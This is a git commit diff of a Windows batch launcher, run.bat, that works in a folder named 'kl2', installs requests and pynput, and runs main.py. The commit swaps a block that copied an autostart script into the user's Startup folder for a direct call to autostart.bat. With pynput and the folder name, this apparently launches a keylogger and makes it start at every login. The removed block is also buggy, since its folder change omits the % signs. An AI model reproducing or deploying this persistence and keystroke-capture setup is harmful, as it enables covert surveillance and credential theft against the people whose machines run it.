2230147070b2e1d0d2ee099c078b6188bd9f7f0b
henrycsharp <151407721+Henrycsharp@users.noreply.github.com>
2025-03-10 17:22:34 +0100

    Update run.bat

--- run.bat
+++ run.bat
@@ -6,20 +6,7 @@ cd C:\users\%USERNAME%\kl2
 pip install requests
 pip install pynput
 
-echo Checking for existing autostart rule...
-set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
-set AUTOSTART_FILE=C:\users\%USERNAME%\run.bat
-
-cd STARTUP_FOLDER
-
-if not exist "%AUTOSTART_FILE%" (
-    echo Adding autostart rule...
-    copy autostart.bat
-) else (
-    echo Autostart rule already exists. Skipping.
-)
-
-cd C:\users\%USERNAME%\kl2
+autostart.bat
 
 echo Running main.py...
 main.py
